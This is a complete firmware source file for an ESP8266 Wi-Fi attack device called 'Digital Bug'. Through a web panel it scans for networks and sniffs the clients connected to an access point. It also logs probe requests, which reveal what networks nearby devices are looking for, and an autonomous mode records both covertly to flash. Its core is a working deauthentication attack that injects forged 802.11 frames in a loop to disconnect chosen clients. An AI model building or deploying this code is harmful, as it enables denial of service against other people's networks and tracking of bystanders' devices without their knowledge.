#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>
#include <FS.h>
#include <ArduinoJson.h> // For handling JSON configuration

// --- Pin Configuration ---
#define AUTONOMOUS_MODE_PIN D3 // GPIO0 (Flash button)
#define LED_PIN LED_BUILTIN

// --- Data Structures ---
struct MacHeader {
  uint8_t frameControl[2];
  uint8_t duration[2];
  uint8_t addr1[6];
  uint8_t addr2[6];
  uint8_t addr3[6];
  uint8_t sequenceControl[2];
};

struct DeauthFrame {
  MacHeader macHeader;
  uint8_t reasonCode[2];
};

struct ProbeRequest {
    String clientMac;
    String ssid;
};


// --- Global Variables ---
// MODIFIED: These are now String objects to be loaded from config
String ap_ssid = "Digital Bug";
String ap_password = "deauther";

ESP8266WebServer server(80);
bool autonomousMode = false;
volatile bool stopProcess = false;

// Scanning Globals
#define MAX_RESULTS 30
String foundClients[MAX_RESULTS];
int clientCount = 0;
ProbeRequest foundProbes[MAX_RESULTS];
int probeCount = 0;
String targetBSSID = "";
int sniffingChannel = 0;

// Autonomous Mode Globals
String loggedProbes[100]; 
int loggedProbeCount = 0;


// --- Configuration Management ---
void loadConfiguration() {
    File configFile = LittleFS.open("/config.json", "r");
    if (!configFile) {
        Serial.println("[WARN] config.json not found, using default settings.");
        return;
    }

    StaticJsonDocument<256> doc;
    DeserializationError error = deserializeJson(doc, configFile);
    if (error) {
        Serial.println("[ERROR] Failed to read config file, using default settings.");
        return;
    }

    ap_ssid = doc["ssid"].as<String>();
    ap_password = doc["password"].as<String>();
    configFile.close();
    Serial.println("[OK] Configuration loaded.");
}

void saveConfiguration() {
    StaticJsonDocument<256> doc;
    doc["ssid"] = ap_ssid;
    doc["password"] = ap_password;

    File configFile = LittleFS.open("/config.json", "w");
    if (!configFile) {
        Serial.println("[ERROR] Failed to open config file for writing.");
        return;
    }

    serializeJson(doc, configFile);
    configFile.close();
    Serial.println("[OK] Configuration saved.");
}

// --- Helper Functions ---
String getEncryptionType(uint8_t type) {
  switch (type) {
    case ENC_TYPE_NONE: return "OPEN";
    case ENC_TYPE_WEP: return "WEP";
    case ENC_TYPE_TKIP: return "WPA";
    case ENC_TYPE_CCMP: return "WPA2";
    case ENC_TYPE_AUTO: return "WPA*";
    default: return "???";
  }
}

String macToString(const uint8_t* mac) {
  char buf[20];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

void stringToMac(String macStr, uint8_t* mac) {
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

void addClient(String mac) {
    if (clientCount >= MAX_RESULTS) return;
    for (int i = 0; i < clientCount; i++) {
        if (foundClients[i] == mac) return;
    }
    foundClients[clientCount] = mac;
    clientCount++;
}

void addProbe(String mac, String ssid) {
    if (probeCount >= MAX_RESULTS || ssid.length() == 0) return;
    for (int i = 0; i < probeCount; i++) {
        if (foundProbes[i].clientMac == mac && foundProbes[i].ssid == ssid) return;
    }
    foundProbes[probeCount].clientMac = mac;
    foundProbes[probeCount].ssid = ssid;
    probeCount++;
}


// --- Sniffer Callbacks ---
void universalSnifferCallback(uint8_t *buffer, uint16_t length) {
  MacHeader *header = (MacHeader*)buffer;
  uint8_t frameType = (header->frameControl[0] >> 2) & 0b11;
  uint8_t frameSubtype = (header->frameControl[0] >> 4) & 0b1111;

  if (frameType == 0b10) { // Data Frame for client scanning
    String addr1_str = macToString(header->addr1);
    String addr2_str = macToString(header->addr2);
    if (addr1_str == targetBSSID && addr2_str != "FF:FF:FF:FF:FF:FF") addClient(addr2_str);
    if (addr2_str == targetBSSID && addr1_str != "FF:FF:FF:FF:FF:FF") addClient(addr1_str);
  }
  else if (frameType == 0b00 && frameSubtype == 0b0100) { // Management Frame, Probe Request
      if (length > sizeof(MacHeader) + 1) {
          int ssidLen = buffer[sizeof(MacHeader) + 1];
          if (ssidLen > 0 && ssidLen <= 32) {
              char ssid[ssidLen + 1];
              memcpy(ssid, &buffer[sizeof(MacHeader) + 2], ssidLen);
              ssid[ssidLen] = '\0';
              addProbe(macToString(header->addr2), String(ssid));
          }
      }
  }
}

void autonomousSnifferCallback(uint8_t *buffer, uint16_t length) {
    if (length > sizeof(MacHeader) + 2) {
        MacHeader *header = (MacHeader*)buffer;
        if (((header->frameControl[0] >> 2) & 0b11) == 0b00 && ((header->frameControl[0] >> 4) & 0b1111) == 0b0100) {
            int ssidLen = buffer[sizeof(MacHeader) + 1];
            if (ssidLen > 0 && ssidLen <= 32) {
                char ssid[ssidLen + 1];
                memcpy(ssid, &buffer[sizeof(MacHeader) + 2], ssidLen);
                ssid[ssidLen] = '\0';
                
                String mac = macToString(header->addr2);
                String ssidStr = String(ssid);
                String probeSignature = mac + "->" + ssidStr;
                
                bool alreadyLogged = false;
                for(int i=0; i<loggedProbeCount; i++) {
                    if(loggedProbes[i] == probeSignature) {
                        alreadyLogged = true;
                        break;
                    }
                }

                if (!alreadyLogged && loggedProbeCount < 100) {
                    File logFile = LittleFS.open("/probes.log", "a");
                    if(logFile) {
                        logFile.println(String(millis()) + "," + mac + "," + ssidStr);
                        logFile.close();
                        loggedProbes[loggedProbeCount++] = probeSignature;
                    }
                }
            }
        }
    }
}


// --- Attack Function ---
void sendDeauthFrame(const uint8_t* ap_mac, const uint8_t* client_mac) {
    DeauthFrame deauth;
    deauth.macHeader.frameControl[0] = 0xC0; deauth.macHeader.frameControl[1] = 0x00;
    deauth.macHeader.duration[0] = 0x3a; deauth.macHeader.duration[1] = 0x01;
    memcpy(deauth.macHeader.addr1, client_mac, 6);
    memcpy(deauth.macHeader.addr2, ap_mac, 6);
    memcpy(deauth.macHeader.addr3, ap_mac, 6);
    deauth.macHeader.sequenceControl[0] = 0x00; deauth.macHeader.sequenceControl[1] = 0x00;
    deauth.reasonCode[0] = 0x07; deauth.reasonCode[1] = 0x00;
    wifi_send_pkt_freedom((uint8_t*)&deauth, sizeof(DeauthFrame), 0);
}


// --- Web Server Handlers ---
void handleRoot() {
  if (LittleFS.exists("/index.html")) {
    File file = LittleFS.open("/index.html", "r");
    server.streamFile(file, "text/html");
    file.close();
  } else {
    server.send(404, "text/plain", "Error: index.html not found.");
  }
}

void handleScan() {
  int n = WiFi.scanNetworks();
  String html = "";
  if (n > 0) {
    for (int i = 0; i < n; ++i) {
      String rssi_color = "text-green-300";
      if(WiFi.RSSI(i) < -70) rssi_color = "text-yellow-400";
      if(WiFi.RSSI(i) < -80) rssi_color = "text-red-400";
      String radioValue = WiFi.BSSIDstr(i) + "," + String(WiFi.channel(i));
      html += "<tr><td class='px-4 py-3 font-medium text-green-300'>" + WiFi.SSID(i) + "</td><td class='px-4 py-3 text-green-500'>" + WiFi.BSSIDstr(i) + "</td><td class='px-4 py-3 " + rssi_color + " font-semibold'>" + String(WiFi.RSSI(i)) + "</td><td class='px-4 py-3 text-green-500'>" + String(WiFi.channel(i)) + "</td><td class='px-4 py-3'><span class='";
      html += (WiFi.encryptionType(i) == ENC_TYPE_NONE ? "text-red-400" : "text-green-300");
      html += "'>" + getEncryptionType(WiFi.encryptionType(i)) + "</span></td><td class='px-4 py-3'><input type='radio' name='target_ap' class='form-radio h-4 w-4 bg-gray-900 border-green-700' value='" + radioValue + "'></td></tr>";
    }
  } else {
      html = "<tr><td colspan='6' class='text-center px-4 py-3 text-gray-500'>No networks found.</td></tr>";
  }
  server.send(200, "text/html", html);
}

void handleClientScan() {
    if (!server.hasArg("target")) { server.send(400, "text/plain", "Bad Request"); return; }
    stopProcess = false;
    String target = server.arg("target");
    int commaIndex = target.indexOf(',');
    targetBSSID = target.substring(0, commaIndex);
    sniffingChannel = target.substring(commaIndex + 1).toInt();
    clientCount = 0;
    wifi_set_channel(sniffingChannel);
    wifi_promiscuous_enable(1);
    wifi_set_promiscuous_rx_cb(universalSnifferCallback);
    unsigned long startTime = millis();
    while(millis() - startTime < 10000 && !stopProcess) { server.handleClient(); delay(1); }
    wifi_promiscuous_enable(0);
    String html = "";
    if (clientCount > 0) {
        for (int i = 0; i < clientCount; i++) {
            html += "<tr><td class='px-4 py-3 text-green-300'>" + foundClients[i] + "</td><td class='px-4 py-3 text-green-500'>" + targetBSSID + "</td><td class='px-4 py-3 text-green-500'>N/A</td><td class='px-4 py-3'><input type='checkbox' name='target_client' class='form-checkbox h-4 w-4 bg-gray-900 border-green-700' value='" + foundClients[i] + "'></td></tr>";
        }
    } else {
        html = "<tr><td colspan='4' class='text-center px-4 py-3 text-yellow-400'>No clients found.</td></tr>";
    }
    server.send(200, "text/html", html);
}

void handleProbeSniff() {
    if (!server.hasArg("channel")) { server.send(400, "text/plain", "Bad Request: Missing channel."); return; }
    stopProcess = false;
    sniffingChannel = server.arg("channel").toInt();
    probeCount = 0;
    
    wifi_set_channel(sniffingChannel);
    wifi_promiscuous_enable(1);
    wifi_set_promiscuous_rx_cb(universalSnifferCallback);
    
    unsigned long startTime = millis();
    while(millis() - startTime < 15000 && !stopProcess) { // Sniff for 15 seconds
        server.handleClient();
        delay(1);
    }
    wifi_promiscuous_enable(0);
    
    String html = "";
    if (probeCount > 0) {
        for (int i = 0; i < probeCount; i++) {
            html += "<tr><td class='px-4 py-3 text-green-300'>" + foundProbes[i].clientMac + "</td><td class='px-4 py-3 font-medium text-green-300'>" + foundProbes[i].ssid + "</td></tr>";
        }
    } else {
        html = "<tr><td colspan='2' class='text-center px-4 py-3 text-yellow-400'>No probe requests detected.</td></tr>";
    }
    server.send(200, "text/html", html);
}

void handleAttack() {
    if (!server.hasArg("ap_bssid") || !server.hasArg("channel") || !server.hasArg("clients")) { server.send(400, "text/plain", "Bad Request"); return; }
    stopProcess = false;
    int channel = server.arg("channel").toInt();
    String ap_bssid_str = server.arg("ap_bssid");
    String clients_str = server.arg("clients");
    uint8_t ap_mac[6];
    stringToMac(ap_bssid_str, ap_mac);
    server.send(200, "text/plain", "OK. Attack started.");
    wifi_set_channel(channel);
    while(!stopProcess) {
        int currentPos = 0;
        while(currentPos < clients_str.length()) {
            int nextPos = clients_str.indexOf(',', currentPos);
            if (nextPos == -1) nextPos = clients_str.length();
            String client_mac_str = clients_str.substring(currentPos, nextPos);
            uint8_t client_mac[6];
            stringToMac(client_mac_str, client_mac);
            sendDeauthFrame(ap_mac, client_mac);
            sendDeauthFrame(client_mac, ap_mac);
            currentPos = nextPos + 1;
        }
        server.handleClient();
        delay(2);
    }
}

void handleStop() {
    stopProcess = true;
    server.send(200, "text/plain", "OK. Process will be stopped.");
}

void handleLogs() {
    String html = "<html><body style='font-family: monospace; background-color: #0D0D0D; color: #3bff01;'><h1>Log Files</h1>";
    Dir dir = LittleFS.openDir("/");
    while (dir.next()) {
        html += "<a href='/download?file=" + dir.fileName() + "' style='color: #3bff01;'>" + dir.fileName() + "</a> (" + dir.fileSize() + " bytes)<br>";
    }
    html += "</body></html>";
    server.send(200, "text/html", html);
}

void handleDownload() {
    if (server.hasArg("file")) {
        String fileName = server.arg("file");
        if (LittleFS.exists(fileName)) {
            File file = LittleFS.open(fileName, "r");
            server.streamFile(file, "text/plain");
            file.close();
        } else {
            server.send(404, "text/plain", "File Not Found");
        }
    } else {
        server.send(400, "text/plain", "Bad Request");
    }
}

void handleGetConfig() {
    StaticJsonDocument<256> doc;
    doc["ssid"] = ap_ssid;
    doc["password"] = ap_password;
    String output;
    serializeJson(doc, output);
    server.send(200, "application/json", output);
}

void handleSetConfig() {
    if (!server.hasArg("ssid") || !server.hasArg("password")) {
        server.send(400, "text/plain", "Bad Request");
        return;
    }
    ap_ssid = server.arg("ssid");
    ap_password = server.arg("password");
    saveConfiguration();
    server.send(200, "text/plain", "Settings saved. The device will now restart to apply changes.");
    delay(1000);
    ESP.restart();
}

void handleNotFound() {
  server.send(404, "text/plain", "Not Found");
}

// --- OPTIMIZED Autonomous Mode ---
void runAutonomousMode() {
    pinMode(LED_PIN, OUTPUT);
    digitalWrite(LED_PIN, HIGH);
    String loggedBSSIDs[100]; int loggedBSSIDCount = 0;
    
    wifi_set_promiscuous_rx_cb(autonomousSnifferCallback);

    while(true) {
        digitalWrite(LED_PIN, LOW); delay(50); digitalWrite(LED_PIN, HIGH); delay(50);
        digitalWrite(LED_PIN, LOW); delay(50); digitalWrite(LED_PIN, HIGH);

        for (int ch : {1, 6, 11}) {
            wifi_set_channel(ch);
            wifi_promiscuous_enable(1);
            delay(5000);
        }
        wifi_promiscuous_enable(0);

        int n = WiFi.scanNetworks();
        if (n > 0) {
            File logFile = LittleFS.open("/networks.log", "a");
            if (logFile) {
                for (int i = 0; i < n; i++) {
                    bool alreadyLogged = false;
                    for (int j = 0; j < loggedBSSIDCount; j++) {
                        if (loggedBSSIDs[j] == WiFi.BSSIDstr(i)) {
                            alreadyLogged = true;
                            break;
                        }
                    }
                    if (!alreadyLogged && loggedBSSIDCount < 100) {
                        String entry = String(millis()) + "," + WiFi.SSID(i) + "," + WiFi.BSSIDstr(i) + "," + String(WiFi.RSSI(i)) + "," + String(WiFi.channel(i)) + "," + getEncryptionType(WiFi.encryptionType(i));
                        logFile.println(entry);
                        loggedBSSIDs[loggedBSSIDCount++] = WiFi.BSSIDstr(i);
                    }
                }
                logFile.close();
            }
        }
        delay(10000);
    }
}

// --- Main Setup & Loop ---
void setup() {
  Serial.begin(115200);
  pinMode(AUTONOMOUS_MODE_PIN, INPUT_PULLUP);
  delay(100);

  if (!LittleFS.begin()) {
    Serial.println("[FATAL] File system failed to mount. Halting.");
    return;
  }
  
  loadConfiguration();

  if (digitalRead(AUTONOMOUS_MODE_PIN) == LOW) {
    autonomousMode = true;
    runAutonomousMode();
  }

  Serial.println("\n[MODE] Interactive Mode Active. Starting web server...");
  
  WiFi.softAP(ap_ssid.c_str(), ap_password.c_str());
  Serial.print("[OK] Access Point '");
  Serial.print(ap_ssid);
  Serial.println("' started.");
  Serial.print("[INFO] IP Address: ");
  Serial.println(WiFi.softAPIP());

  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/clients", HTTP_GET, handleClientScan);
  server.on("/probes", HTTP_GET, handleProbeSniff);
  server.on("/attack", HTTP_POST, handleAttack);
  server.on("/stop", HTTP_GET, handleStop);
  server.on("/logs", HTTP_GET, handleLogs);
  server.on("/download", HTTP_GET, handleDownload);
  server.on("/getconfig", HTTP_GET, handleGetConfig);
  server.on("/setconfig", HTTP_POST, handleSetConfig);
  server.onNotFound(handleNotFound);

  server.begin();
  Serial.println("[OK] Web server started.");
}

void loop() {
  if (!autonomousMode) {
    server.handleClient();
  }
}
